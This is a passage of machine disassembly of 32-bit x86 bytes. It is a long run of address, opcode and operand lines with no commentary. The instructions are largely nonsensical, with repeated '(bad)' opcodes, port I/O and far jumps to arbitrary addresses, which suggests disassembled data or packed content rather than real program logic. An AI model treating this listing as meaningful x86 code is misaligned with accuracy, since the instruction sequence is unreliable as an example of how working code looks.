  41cf8d:	sub    ecx,DWORD PTR [esi-0x2a]
  41cf90:	jne    0x41cf75
  41cf92:	sar    DWORD PTR [ecx],cl
  41cf94:	mov    dl,0xb8
  41cf96:	stos   BYTE PTR es:[edi],al
  41cf97:	rcr    BYTE PTR [eax+0x2d],0x33
  41cf9b:	mov    bh,0x57
  41cf9d:	add    al,0xe2
  41cf9f:	adc    bh,dl
  41cfa1:	ins    BYTE PTR es:[edi],dx
  41cfa2:	int3   
  41cfa3:	bound  di,DWORD PTR ds:0xcde5ba68
  41cfaa:	mov    ds:0xe3b63070,al
  41cfaf:	lea    ebx,[edx+0x1e7312ef]
  41cfb5:	mov    edi,0xd8fad2e1
  41cfba:	pop    ds
  41cfbb:	cld    
  41cfbc:	out    dx,eax
  41cfbd:	or     eax,0xd0cde82
  41cfc2:	ins    DWORD PTR es:[edi],dx
  41cfc3:	push   cs
  41cfc4:	mov    edi,0xed186ad0
  41cfc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfca:	lods   eax,DWORD PTR ds:[esi]
  41cfcb:	outs   dx,BYTE PTR ds:[esi]
  41cfcc:	push   esi
  41cfcd:	inc    edi
  41cfce:	call   0x3f5682c8
  41cfd3:	bound  ecx,QWORD PTR [esi-0x762e3163]
  41cfd9:	pushf  
  41cfda:	icebp  
  41cfdb:	mov    DWORD PTR [eax+0x19cfc449],esp
  41cfe1:	jl     0x41d03d
  41cfe3:	addr16 push esi
  41cfe5:	test   eax,0x29e269ab
  41cfea:	test   al,0xf
  41cfec:	sbb    eax,0xe1c0b6f0
  41cff1:	jmp    0xd00f21ba
  41cff6:	dec    ecx
  41cff7:	inc    ebx
  41cff8:	xor    DWORD PTR [ebp+0x21],edi
  41cffb:	sbb    DWORD PTR [eax-0x733555fa],esi
  41d001:	xor    ch,dl
  41d003:	xlat   BYTE PTR ds:[ebx]
  41d004:	outs   dx,BYTE PTR ds:[esi]
  41d005:	cdq    
  41d006:	or     BYTE PTR [edi],bh
  41d008:	jns    0x41cfa3
  41d00a:	test   eax,0xf2459e32
  41d00f:	and    BYTE PTR [eax-0x6a9f514f],dl
  41d015:	mov    WORD PTR [ecx+0x2e920834],cs
  41d01b:	out    dx,al
  41d01c:	(bad)  
  41d01d:	repnz xchg edi,eax
  41d01f:	lahf   
  41d020:	(bad)  
  41d021:	das    
  41d022:	inc    edx
  41d023:	fiadd  WORD PTR [ecx-0x3bb22967]
  41d029:	push   ebp
  41d02a:	call   0x424d:0x6bcb238
  41d031:	dec    ebp
  41d032:	cmc    
  41d033:	adc    al,0xe5
  41d035:	push   ebp
  41d036:	call   FWORD PTR [ebx]
  41d038:	in     al,dx
  41d039:	jne    0x41d0aa
  41d03b:	int    0xa1
  41d03d:	sub    eax,0xe8b139eb
  41d042:	jns    0x41d05e
  41d044:	lods   al,BYTE PTR ds:[esi]
  41d045:	mov    DWORD PTR [esp+edx*1+0x75],0x14fe7e52
  41d04d:	or     BYTE PTR ds:0xb2306301,0x50
  41d054:	repz sub ecx,edx
  41d057:	aas    
  41d058:	enter  0x3eaa,0xd7
  41d05c:	lahf   
  41d05d:	inc    ecx
  41d05e:	push   ss
  41d05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d060:	mov    ds:0x408874e,eax
  41d065:	sub    ebx,DWORD PTR [ecx-0x56f58cc7]
  41d06b:	ja     0x41d07a
  41d06d:	adc    edi,DWORD PTR [eax+0x215b3e0c]
  41d073:	pop    ebp
  41d074:	mov    fs,WORD PTR [esi-0x6fbfb8a]
  41d07a:	push   ebp
  41d07b:	jle    0x41d0a9
  41d07d:	mov    esi,0xa51010e3
  41d082:	cmp    DWORD PTR [ebp+0x20],esi
  41d085:	fwait
  41d086:	push   esi
  41d087:	push   ecx
  41d088:	jo     0x41d05e
  41d08a:	and    BYTE PTR [edx+ecx*2],ah
  41d08d:	loop   0x41d01c
  41d08f:	pop    ecx
  41d090:	shr    DWORD PTR [eax-0x75],1
  41d093:	pop    esp
  41d094:	jo     0x41d031
  41d096:	arpl   WORD PTR [edi-0x53],si
  41d099:	loopne 0x41d0f4
  41d09b:	lods   al,BYTE PTR ds:[esi]
  41d09c:	inc    ecx
  41d09d:	out    dx,eax
  41d09e:	fcom   DWORD PTR [eax+esi*4]
  41d0a1:	test   BYTE PTR gs:[esi],al
  41d0a4:	test   eax,0x6218581
  41d0a9:	and    eax,0x785ca718
  41d0ae:	fcomp  st(3)
  41d0b0:	nop
  41d0b1:	pushf  
  41d0b2:	fs popf 
  41d0b4:	imul   eax,DWORD PTR [eax],0xffffffa1
  41d0b7:	mov    al,ds:0xd0645896
  41d0bc:	push   eax
  41d0bd:	pop    ds
  41d0be:	pop    es
  41d0bf:	ror    DWORD PTR [edi-0x13],1
  41d0c2:	cmp    cl,BYTE PTR [esi+0x1e19179a]
  41d0c8:	cmp    DWORD PTR [ebx],esi
  41d0ca:	setno  BYTE PTR [edx]
  41d0cd:	mov    al,0x58
  41d0cf:	xchg   BYTE PTR [ecx-0x3982d9c6],dl
  41d0d5:	inc    esi
  41d0d6:	push   cs
  41d0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0d8:	(bad)  
  41d0d9:	mov    edi,0x6cec46b
  41d0de:	pop    ss
  41d0df:	retf   0xc75e
  41d0e2:	or     BYTE PTR [ecx-0x1a85d4bd],0xa3
  41d0e9:	sub    BYTE PTR [edi],dl
  41d0eb:	mov    edx,edi
  41d0ed:	test   al,0x97
  41d0ef:	(bad)  
  41d0f0:	jg     0x41d104
  41d0f2:	jecxz  0x41d134
  41d0f4:	sub    DWORD PTR [ecx-0x47],ebx
  41d0f7:	and    DWORD PTR ds:0xf8ef6a7c,esp
  41d0fd:	ja     0x41d174
  41d0ff:	sub    bp,sp
  41d102:	lds    esi,FWORD PTR [edi+0x73]
  41d105:	sti    
  41d106:	cdq    
  41d107:	ror    DWORD PTR [eax],1
  41d109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d10a:	adc    ah,BYTE PTR [eax-0x7c]
  41d10d:	cdq    
  41d10e:	outs   dx,BYTE PTR ds:[esi]
  41d10f:	push   DWORD PTR [ebx]
  41d111:	into   
  41d112:	cmp    edx,DWORD PTR [ebp-0x42598079]
  41d118:	ins    BYTE PTR es:[edi],dx
  41d119:	push   eax
  41d11a:	xchg   edx,eax
  41d11b:	pushf  
  41d11c:	and    al,0xb5
  41d11e:	in     eax,dx
  41d11f:	xchg   ebp,eax
  41d120:	mov    cl,ch
  41d122:	and    esp,ebx
  41d124:	js     0x41d129
  41d126:	fistp  WORD PTR [eax]
  41d128:	gs fcmovb st,st(4)
  41d12b:	int    0x26
  41d12d:	loope  0x41d0de
  41d12f:	and    ecx,DWORD PTR [esi-0x4988d856]
  41d135:	bound  esi,QWORD PTR [esi]
  41d137:	adc    ebp,esp
  41d139:	out    0x67,eax
  41d13b:	popa   
  41d13c:	dec    eax
  41d13d:	jno    0x41d0ce
  41d13f:	add    al,0x7f
  41d141:	movups xmm6,xmm5
  41d144:	and    ah,BYTE PTR [ecx]
  41d146:	adc    al,0x13
  41d148:	dec    edx
  41d149:	icebp  
  41d14a:	mov    bh,0xa2
  41d14c:	retf   
  41d14d:	mov    esi,0xeeea2fc8
  41d152:	xor    BYTE PTR [ebx+0x45],bh
  41d155:	cmp    eax,0x86beda6d
  41d15a:	adc    DWORD PTR [ebx-0x18de84b0],0xffffffdf
  41d161:	into   
  41d162:	int    0xf3
  41d164:	pop    edi
  41d165:	or     esp,ebx
  41d167:	imul   BYTE PTR [edi+0x41]
  41d16a:	push   0x2eb7cfca
  41d16f:	push   edx
  41d170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d171:	rcl    DWORD PTR [eax],0xa1
  41d174:	fild   DWORD PTR [eax+0x1d76f666]
  41d17a:	repz jns 0x41d146
  41d17d:	fcom   DWORD PTR ds:0x42f9409a
  41d183:	xor    ch,BYTE PTR [ebx+0x48]
  41d186:	(bad)  
  41d187:	sti    
  41d188:	add    DWORD PTR cs:[edx-0x37],edi
  41d18c:	std    
  41d18d:	mov    bl,0xac
  41d18f:	(bad)  
  41d190:	adc    ch,ch
  41d192:	mov    eax,0x4166dee5
  41d197:	leave  
  41d198:	sub    al,BYTE PTR [ecx-0x5e0b4cbb]
  41d19e:	lds    edx,FWORD PTR [edx]
  41d1a0:	inc    eax
  41d1a1:	adc    eax,0xfd98eb90
  41d1a6:	mov    eax,ds:0x24324fa3
  41d1ab:	ror    BYTE PTR [ebp-0x2],0x12
  41d1af:	xlat   BYTE PTR ds:[ebx]
  41d1b0:	xor    DWORD PTR [eax-0x4f],0x23
  41d1b4:	jl     0x41d207
  41d1b6:	scas   al,BYTE PTR es:[edi]
  41d1b7:	jg     0x41d13e
  41d1b9:	mov    ebx,0x94f21fd2
  41d1be:	dec    ebx
  41d1bf:	outs   dx,BYTE PTR ds:[esi]
  41d1c0:	or     BYTE PTR [edi+eax*8+0x28132515],0x4d
  41d1c8:	jge    0x41d17b
  41d1ca:	push   ecx
  41d1cb:	sub    al,0xff
  41d1ce:	xor    BYTE PTR [ecx],bh
  41d1d0:	jecxz  0x41d15e
  41d1d2:	leave  
  41d1d3:	retf   0x5eba
  41d1d6:	push   ebp
  41d1d7:	fiadd  WORD PTR [ebx-0x654ab3c]
  41d1dd:	addr16 push 0x6a
  41d1e0:	or     cl,BYTE PTR [esi-0x47]
  41d1e3:	push   edx
  41d1e4:	mov    esp,0xe8a94d74
  41d1e9:	stc    
  41d1ea:	jg     0x41d1e4
  41d1ec:	push   ecx
  41d1ed:	data16 and BYTE PTR [ebx+edx*1],bh
  41d1f1:	and    ch,al
  41d1f3:	test   DWORD PTR [edi-0x6a27fca0],esi
  41d1f9:	ror    edx,1
  41d1fb:	fidiv  DWORD PTR [edi]
  41d1fd:	mov    WORD PTR [esp+esi*4-0x3d8c9a3e],ds
  41d204:	cmp    esp,DWORD PTR [edi-0x59]
  41d207:	jle    0x41d216
  41d209:	jne    0x41d24a
  41d20b:	xor    al,BYTE PTR [eax]
  41d20d:	rcl    DWORD PTR [eax+0x16],cl
  41d210:	push   edx
  41d211:	in     eax,0xd
  41d213:	repz dec edx
  41d215:	sti    
  41d216:	mov    ch,0xa5
  41d218:	retf   
  41d219:	or     DWORD PTR [edi+0x4b],esi
  41d21c:	lods   eax,DWORD PTR ds:[esi]
  41d21d:	es clc 
  41d21f:	sub    eax,0xcff99e29
  41d224:	push   ebx
  41d225:	or     BYTE PTR [edx-0x7b0e45b9],0xdf
  41d22c:	jmp    0x5a620b73
  41d231:	inc    eax
  41d232:	out    dx,eax
  41d233:	jbe    0x41d290
  41d235:	jnp    0x41d293
  41d237:	(bad)  
  41d239:	jmp    0x10d5:0x6f03f665
  41d240:	jae    0x41d29e
  41d242:	adc    edi,DWORD PTR [edi]
  41d244:	mov    ebp,DWORD PTR [ebp+0x6b4975d2]
  41d24a:	repz push cs
  41d24c:	jno    0x41d259
  41d24e:	mov    eax,ds:0xc6132ecc
  41d253:	and    DWORD PTR [esi+ebp*8],edx
  41d256:	mov    bh,0x86
  41d258:	push   edx
  41d259:	xchg   esp,eax
  41d25a:	iret   
  41d25b:	push   0x77
  41d25d:	xchg   BYTE PTR [edi+0x36],dl
  41d260:	cmp    eax,0xd4c1ae7a
  41d265:	mov    edi,DWORD PTR ds:0x728bddcd
  41d26b:	mov    eax,ds:0x31ddf917
  41d270:	mov    DWORD PTR [esi],eax
  41d272:	test   DWORD PTR [ebx+ebp*1+0x68],0x4c6a5ad6
  41d27a:	adc    al,0xf4
  41d27c:	or     al,0xff
  41d27e:	dec    edx
  41d27f:	mov    ch,BYTE PTR [ecx+0x73]
  41d282:	fdiv   QWORD PTR [edx]
  41d284:	and    BYTE PTR gs:[edx],dl
  41d287:	cmp    eax,0xdea6d0fd
  41d28c:	mov    ecx,0x936a1e0d
  41d291:	rcl    BYTE PTR [ebx],cl
  41d293:	inc    edi
  41d294:	repz ss popf 
  41d297:	dec    ecx
  41d298:	cmp    ebp,edx
  41d29a:	cmp    ebx,ebp
  41d29c:	lods   al,BYTE PTR ds:[esi]
  41d29d:	push   ebp
  41d29e:	cmp    al,BYTE PTR [ecx-0x71]
  41d2a1:	test   al,0x5e
  41d2a3:	pop    ecx
  41d2a4:	out    dx,eax
  41d2a5:	(bad)
  41d2a8:	or     DWORD PTR [esi-0x2b19165b],0xfd14a355
  41d2b2:	or     eax,0xb769745b
  41d2b7:	sub    edx,DWORD PTR [edi-0x38b03be4]
  41d2bd:	cmp    DWORD PTR [edi+ecx*8],eax
  41d2c0:	mov    esi,0xc11d2c83
  41d2c5:	push   0x4
  41d2c7:	mov    dl,0xb7
  41d2c9:	push   0x738c6c8c
  41d2ce:	dec    ebx
  41d2cf:	xor    eax,0x9c5bcc05
  41d2d4:	mov    ds:0x7a49aed0,al
  41d2d9:	loopne 0x41d31a
  41d2db:	xor    edi,0x25
  41d2de:	inc    ebx
  41d2df:	and    al,0x43
  41d2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e2:	and    BYTE PTR [edx+ecx*2+0x146ece07],0xfe
  41d2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2eb:	push   esi
  41d2ec:	adc    esi,DWORD PTR [eax+0x6e]
  41d2ef:	sbb    eax,0x53135c3f
  41d2f4:	and    eax,DWORD PTR [edx-0x54]
  41d2f7:	call   0x7a6b952b
  41d2fc:	jb     0x41d31d
  41d2fe:	cli    
  41d2ff:	jl     0x41d317
  41d301:	cwde   
  41d302:	mov    edx,DWORD PTR [bp+si-0x69bb]
  41d307:	mov    ebp,0x99caa1c8
  41d30c:	mov    edx,0x4ecd0c0a
  41d311:	dec    edx
  41d312:	loope  0x41d31f
  41d314:	sub    DWORD PTR [esp+ecx*4-0x72],0x2b2ff97
  41d31c:	mov    bh,BYTE PTR [esi+edi*1+0x63]
  41d320:	sub    cl,BYTE PTR es:[ecx+ebp*1-0x35]
  41d325:	out    0xcf,al
  41d327:	mov    dl,0x46
  41d329:	stc    
  41d32a:	addr16 es mov edi,0xf9868f3c
  41d331:	and    BYTE PTR [ebx+0x16698c3],ch
  41d337:	out    dx,eax
  41d338:	mov    ah,cl
  41d33a:	adc    eax,0x6c43401e
  41d33f:	ins    DWORD PTR es:[edi],dx
  41d340:	xor    eax,0x40ba126
  41d345:	push   ebp
  41d346:	pop    ss
  41d347:	mov    dl,0x45
  41d349:	or     BYTE PTR [ebx+0x7dff44e2],0xb0
  41d350:	sbb    ecx,DWORD PTR [ecx+0x674bd40d]
  41d356:	xor    al,BYTE PTR [ebx]
  41d358:	pop    edx
  41d359:	das    
  41d35a:	ficomp WORD PTR [ebx-0x76252cbd]
  41d360:	adc    al,0xa
  41d362:	inc    esp
  41d363:	scas   eax,DWORD PTR es:[edi]
  41d364:	iret   
  41d365:	add    esp,DWORD PTR [esi+esi*1]
  41d368:	outs   dx,BYTE PTR ds:[esi]
  41d369:	dec    edx
  41d36a:	fcom   QWORD PTR [esi+eiz*1-0x2]
  41d36e:	lock add ah,BYTE PTR [ebx]
  41d371:	dec    eax
  41d372:	cmp    esi,DWORD PTR [esi-0x174d0ff7]
  41d378:	loop   0x41d3a3
  41d37a:	mov    BYTE PTR [edi],ah
  41d37c:	push   ss
  41d37d:	sub    esi,DWORD PTR [ecx-0x79]
  41d380:	mov    dl,0x9c
  41d382:	imul   esi,DWORD PTR [esi-0x798aebd9],0xb7892985
  41d38c:	jmp    0x517868d5
  41d391:	xchg   ebp,eax
  41d392:	repnz sbb al,0x3d
  41d395:	mov    ecx,0x6375cf01
  41d39a:	stc    
  41d39b:	les    edx,FWORD PTR [ebx+ecx*1-0xf4b4a7c]
  41d3a2:	pop    es
  41d3a3:	repz jnp 0x41d335
  41d3a6:	retf   0x6021
  41d3a9:	in     al,dx
  41d3aa:	jmp    0x41d3fc
  41d3ac:	in     al,dx
  41d3ad:	xchg   DWORD PTR [ebx],esp
  41d3af:	out    dx,eax
  41d3b0:	or     BYTE PTR ds:0x84222cee,ah
  41d3b6:	sbb    DWORD PTR [edi],edi
  41d3b8:	add    al,0x3d
  41d3ba:	sub    eax,0x3c447d95
  41d3bf:	or     ebx,DWORD PTR [esi+0x58]
  41d3c2:	outs   dx,WORD PTR ds:[esi]
  41d3c4:	cwde   
  41d3c5:	aad    0xff
  41d3c7:	and    ecx,edx
  41d3c9:	pop    ecx
  41d3ca:	sbb    eax,0x6c96a1f2
  41d3cf:	dec    esp
  41d3d0:	int3   
  41d3d1:	scas   eax,DWORD PTR es:[edi]
  41d3d2:	adc    ch,BYTE PTR [esi-0x5a]
  41d3d5:	adc    al,0xe8
  41d3d7:	inc    ecx
  41d3d8:	pop    esp
  41d3d9:	in     al,dx
  41d3da:	in     eax,0x6f
  41d3dc:	mov    esp,0xa20ac426
  41d3e1:	jge    0x41d38b
  41d3e3:	aam    0x76
  41d3e5:	or     al,BYTE PTR [ebx-0x43]
  41d3e8:	into   
  41d3e9:	cs (bad) 
  41d3eb:	jg     0x41d387
  41d3ed:	sti    
  41d3ee:	mov    al,ds:0x7c0a362f
  41d3f3:	clc    
  41d3f4:	cmp    eax,0xaa007ce5
  41d3f9:	ja     0x41d3be
  41d3fb:	jo     0x41d47a
  41d3fd:	adc    edi,DWORD PTR [ebx+0x2e]
  41d400:	test   eax,0x7cd547bb
  41d405:	test   eax,0x35ab1079
  41d40a:	nop
  41d40b:	add    ebp,DWORD PTR [ebx+0x156f81c4]
  41d411:	mov    dh,0x60
  41d413:	jge    0x41d407
  41d415:	ins    BYTE PTR es:[edi],dx
  41d416:	hlt    
  41d417:	call   0xa8c8:0xdd704f52
  41d41e:	lea    esi,[esp+ebx*8]
  41d421:	enter  0x2aac,0xf1
  41d425:	cs mov esi,0xf59b046c
  41d42b:	icebp  
  41d42c:	and    DWORD PTR [esi],ebx
  41d42e:	xor    esp,DWORD PTR [edx+0x22c0dd28]
  41d434:	inc    esp
  41d435:	jecxz  0x41d427
  41d437:	xlat   BYTE PTR ds:[ebx]
  41d438:	xlat   BYTE PTR ds:[ebx]
  41d439:	jbe    0x41d471
  41d43b:	mov    eax,es:0xae65c67c
  41d441:	out    0x99,eax
  41d443:	push   0x14a3fc8f
  41d448:	retf   0x3ce3
  41d44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d44c:	mov    al,ds:0xaf7289b3
  41d451:	das    
  41d452:	jae    0x41d487
  41d454:	stc    
  41d455:	lahf   
  41d456:	arpl   bx,bx
  41d458:	clc    
  41d459:	jbe    0x41d40b
  41d45b:	adc    eax,0x92f785d0
  41d460:	gs leave 
  41d462:	outs   dx,BYTE PTR ds:[esi]
  41d463:	cmc    
  41d464:	retf   
  41d465:	sub    BYTE PTR ds:0x14f2cdb7,dl
  41d46b:	ficomp DWORD PTR [edi-0x1c]
  41d46e:	arpl   WORD PTR [bp-0x3d54],ax
  41d473:	loop   0x41d3f7
  41d475:	ins    BYTE PTR es:[edi],dx
  41d476:	pop    ecx
  41d477:	ret    
  41d478:	repz rcl BYTE PTR ds:0x335f325f,1
  41d47f:	mov    ecx,0xb87bf400
  41d484:	out    0x83,eax
  41d486:	jbe    0x41d42f
  41d488:	ja     0x41d4a7
  41d48a:	mov    dl,0x12
  41d48c:	pop    edi
  41d48d:	mov    bh,0x75
  41d48f:	shr    BYTE PTR [eax],0xd3
  41d492:	xchg   dl,bl
  41d494:	fdiv   DWORD PTR [edi+0x24]
  41d497:	mov    cl,0x6a
  41d499:	cdq    
  41d49a:	in     eax,0x9b
  41d49c:	push   edx
  41d49d:	adc    BYTE PTR [edx+ecx*1],dl
  41d4a0:	aam    0x32
  41d4a2:	out    dx,eax
  41d4a3:	out    0x8f,ax
  41d4a6:	or     DWORD PTR [esi+eax*4-0x1d],ebp
  41d4aa:	mov    esi,0xd35362f3
  41d4af:	jo     0x41d456
  41d4b1:	push   es
  41d4b2:	out    0xc2,al
  41d4b4:	sub    eax,0x2d7c4a60
  41d4b9:	(bad)  
  41d4ba:	pusha  
  41d4bb:	or     al,0x54
  41d4bd:	scas   al,BYTE PTR es:[edi]
  41d4be:	push   ecx
  41d4bf:	mov    esp,0xc6d6aa6c
  41d4c4:	lods   al,BYTE PTR ds:[esi]
  41d4c5:	pop    es
  41d4c6:	mov    ch,0xc5
  41d4c8:	or     cl,al
  41d4ca:	pop    esp
  41d4cb:	add    DWORD PTR [edx+ebp*4],ecx
  41d4ce:	jno    0x41d455
  41d4d0:	lds    eax,FWORD PTR [edi-0x5f]
  41d4d3:	(bad)  
  41d4d4:	jecxz  0x41d470
  41d4d6:	sahf   
  41d4d7:	(bad)  
  41d4d8:	(bad)  
  41d4d9:	out    dx,eax
  41d4da:	sahf   
  41d4db:	push   edx
  41d4dc:	shl    cl,0xf0
  41d4df:	js     0x41d496
  41d4e1:	mov    esp,0x2da9d481
  41d4e6:	aad    0xe9
  41d4e8:	lahf   
  41d4e9:	test   eax,0x5ae942dc
  41d4ee:	sbb    BYTE PTR [esi-0x76],cl
  41d4f1:	sbb    DWORD PTR [edi-0x79],0xffffffb9
  41d4f5:	xor    esi,DWORD PTR [ebx+edi*4+0x7452180c]
  41d4fc:	cmp    edx,edi
  41d4fe:	mov    ah,BYTE PTR [eax-0x3d89de47]
  41d504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d505:	(bad)  
  41d507:	mov    al,0x75
  41d509:	out    0xa8,al
  41d50b:	call   0x6b43cfdf
  41d510:	adc    eax,ecx
  41d512:	mov    esp,0xcdb37501
  41d517:	mov    es,WORD PTR [ecx+0x12]
  41d51a:	cdq    
  41d51b:	push   ds
  41d51c:	mov    ds:0x1e738c94,al
  41d521:	push   edx
  41d522:	add    al,0x6
  41d524:	xchg   ecx,eax
  41d525:	adc    eax,0x388db82e
  41d52a:	jb     0x41d536
  41d52c:	sub    ecx,ecx
  41d52e:	icebp  
  41d52f:	hlt    
  41d530:	dec    eax
  41d531:	mov    esp,0x6e2be110
  41d536:	push   ebx
  41d537:	outs   dx,BYTE PTR ds:[esi]
  41d538:	fisubr WORD PTR [edi]
  41d53a:	xor    BYTE PTR ds:0x343e24a6,0x69
  41d541:	mov    ?,WORD PTR [eax+0x7a]
  41d544:	in     eax,0xc6
  41d546:	xor    DWORD PTR [ecx-0x19],esp
  41d549:	xor    eax,0xe35d2929
  41d54e:	pusha  
  41d54f:	sahf   
  41d550:	jbe    0x41d4f2
  41d552:	cdq    
  41d553:	test   BYTE PTR [ecx-0xbab1b19],al
  41d559:	ret    0x37aa
  41d55c:	xor    al,0xe3
  41d55e:	ins    DWORD PTR es:[edi],dx
  41d55f:	aam    0x48
  41d561:	pusha  
  41d562:	hlt    
  41d563:	das    
  41d564:	imul   ebp,DWORD PTR [ebx+0x54],0x5a
  41d568:	out    0x34,al
  41d56a:	mov    ds:0xe719e9a1,al
  41d56f:	mov    cl,0xb4
  41d571:	mov    gs,WORD PTR [edx+0x59]
  41d574:	push   ds
  41d575:	sub    al,0x5
  41d577:	cmp    eax,0xeff58f01
  41d57c:	int    0x80
  41d57e:	imul   edi,DWORD PTR [edi-0x2a220193],0x6ef39f6e
  41d588:	sub    esp,DWORD PTR [edi+0x1c]
  41d58b:	fwait
  41d58c:	mov    dh,0xcd
  41d58e:	jp     0x41d520
  41d590:	(bad)  
  41d591:	jle    0x41d5f6
  41d593:	xor    esp,DWORD PTR [edi]
  41d595:	push   0xffffffdb
  41d597:	daa    
  41d598:	inc    ecx
  41d599:	js     0x41d56b
  41d59b:	jns    0x41d549
  41d59d:	aas    
  41d59e:	mov    ss,WORD PTR ds:0x9b28c2a7
  41d5a4:	test   DWORD PTR [ecx+0xfaf7ea2],ecx
  41d5aa:	jp     0x41d56b
  41d5ac:	pop    edi
  41d5ad:	test   BYTE PTR [ebp-0x25],dh
  41d5b0:	mov    ?,edx
  41d5b2:	cmc    
  41d5b3:	sbb    ebp,DWORD PTR [esi]
  41d5b5:	pop    edi
  41d5b6:	lahf   
  41d5b7:	jmp    FWORD PTR [ebp+0x1a9188fe]
  41d5bd:	pop    eax
  41d5be:	mov    al,ds:0xf4d21e72
  41d5c3:	inc    ecx
  41d5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c6:	(bad)  
  41d5c7:	gs sbb al,0xca
  41d5ca:	and    eax,0x479f469c
  41d5cf:	mov    cl,0x80
  41d5d1:	scas   eax,DWORD PTR es:[edi]
  41d5d2:	(bad)  
  41d5d3:	repnz loop 0x41d584
  41d5d6:	std    
  41d5d7:	add    eax,DWORD PTR [eax-0x57]
  41d5da:	sti    
  41d5db:	div    BYTE PTR [eax+0x6e]
  41d5de:	pop    edx
  41d5df:	jle    0x41d609
  41d5e1:	mov    ds:0x85a9a57e,al
  41d5e6:	inc    eax
  41d5e7:	scas   eax,DWORD PTR es:[edi]
  41d5e8:	sti    
  41d5e9:	call   0xc6b4:0x830193a7
  41d5f0:	(bad)  
  41d5f1:	int    0xdf
  41d5f3:	sbb    ebx,DWORD PTR [edx-0x686a9056]
  41d5f9:	and    al,0x8c
  41d5fb:	std    
  41d5fc:	and    DWORD PTR [ebx+esi*2-0x3e75a8b8],esp
  41d603:	add    al,0x58
  41d605:	xchg   ebx,eax
  41d606:	inc    ecx
  41d607:	jmp    0x41d649
  41d609:	out    dx,al
  41d60a:	or     BYTE PTR [edx-0x2042bfd0],ch
  41d610:	(bad)  
  41d611:	sub    bl,dh
  41d613:	sbb    al,0x2c
  41d615:	mov    es,WORD PTR [ecx-0x45dd0404]
  41d61b:	ss pop ebx
  41d61d:	jae    0x41d5e8
  41d61f:	fstp   DWORD PTR [edx]
  41d621:	mov    edx,0xdac59e1b
  41d626:	mov    ecx,0xc37ea3fd
  41d62b:	mov    DWORD PTR gs:[ebx],edi
  41d62e:	jecxz  0x41d617
  41d630:	push   esi
  41d631:	inc    ebp
  41d632:	and    ebp,DWORD PTR fs:[esi-0x4385f84d]
  41d639:	dec    esi
  41d63a:	inc    edx
  41d63b:	mov    dl,0xd7
  41d63d:	jne    0x41d5ed
  41d63f:	js     0x41d681
  41d641:	pushf  
  41d642:	push   0x74
  41d644:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d646:	jmp    0x41d6bb
  41d648:	iret   
  41d649:	sub    eax,0xea357a60
  41d64e:	jmp    DWORD PTR [esp+edx*8+0x1a65c709]
  41d655:	mov    ebp,0x5ffc5b59
  41d65a:	or     DWORD PTR [edx+esi*1],edi
  41d65d:	mov    eax,ds:0xf9767a16
  41d662:	push   edi
  41d663:	inc    esi
  41d664:	mov    al,ds:0x7c61f825
  41d669:	rcr    DWORD PTR [ecx+0x3376a829],cl
  41d66f:	pop    ss
  41d670:	push   ss
  41d671:	fadd   DWORD PTR [ecx]
  41d673:	adc    eax,0x2c9e0681
  41d678:	xor    esp,DWORD PTR [ebp+0x62af5da8]
  41d67e:	pop    ds
  41d67f:	jmp    0xc733:0xbdc1033e
  41d686:	mov    dh,0xc5
  41d688:	(bad)  
  41d689:	loopne 0x41d696
  41d68b:	(bad)  
  41d68d:	retf   
  41d68e:	dec    eax
  41d68f:	lods   eax,DWORD PTR ds:[esi]
  41d690:	hlt    
  41d691:	jmp    0xfebd26fc
  41d696:	test   DWORD PTR [ebx-0x36],0x34e0429b
  41d69d:	jb     0x41d6f6
  41d69f:	out    dx,eax
  41d6a0:	jp     0x41d6fc
  41d6a2:	cmp    al,0xff
  41d6a4:	or     dh,BYTE PTR [ebx]
  41d6a6:	sbb    al,0x7
  41d6a8:	adc    ecx,DWORD PTR [ebx+0x1a]
  41d6ab:	icebp  
  41d6ac:	stos   DWORD PTR es:[edi],eax
  41d6ad:	adc    al,0xd4
  41d6af:	mov    al,ch
  41d6b1:	mov    edx,0xe938f37e
  41d6b6:	mov    al,ds:0xed114f4e
  41d6bb:	mov    al,ds:0xd8da9253
  41d6c0:	ins    BYTE PTR es:[edi],dx
  41d6c1:	test   BYTE PTR [ebx-0x41],dl
  41d6c4:	sahf   
  41d6c5:	add    ecx,ebp
  41d6c7:	xchg   ecx,eax
  41d6c8:	sub    eax,0xa16810
  41d6cd:	push   cs
  41d6ce:	jmp    0x46bf03fb
  41d6d3:	loope  0x41d70a
  41d6d5:	std    
  41d6d6:	das    
  41d6d7:	sbb    al,0x82
  41d6d9:	repnz mov dl,0x1b
  41d6dc:	mov    ecx,0x997c04aa
  41d6e1:	sti    
  41d6e2:	fidiv  WORD PTR [esi+ebx*1]
  41d6e5:	push   esi
  41d6e6:	cmp    eax,0xf07bcab5
  41d6eb:	and    al,0xfb
  41d6ed:	jnp    0x41d74c
  41d6ef:	call   0x6e2700f5
  41d6f4:	jbe    0x41d764
  41d6f6:	enter  0x6b0b,0x41
  41d6fa:	and    BYTE PTR [ebx-0x5ef6c832],bh
  41d700:	jge    0x41d6fd
  41d702:	test   DWORD PTR [edx+0x4f],edx
  41d705:	push   ecx
  41d706:	hlt    
  41d707:	daa    
  41d708:	cmp    BYTE PTR [ecx+0x68],ah
  41d70b:	xor    DWORD PTR [eax],0xffffffe8
  41d70e:	imul   ebp,DWORD PTR [eax],0xffffffd7
  41d711:	scas   eax,DWORD PTR es:[edi]
  41d712:	test   DWORD PTR [eax+0x26],edx
  41d715:	out    0xbc,al
  41d717:	test   al,0xd0
  41d719:	pop    esp
  41d71a:	scas   al,BYTE PTR es:[edi]
  41d71b:	shl    DWORD PTR [edx-0x5adce8bd],0xa0
  41d722:	rcl    DWORD PTR ds:0x22174b88,1
  41d728:	ror    DWORD PTR [edx+0x4a64db33],1
  41d72e:	cdq    
  41d72f:	jle    0x41d784
  41d731:	mov    BYTE PTR [esi+0x6bc51011],bl
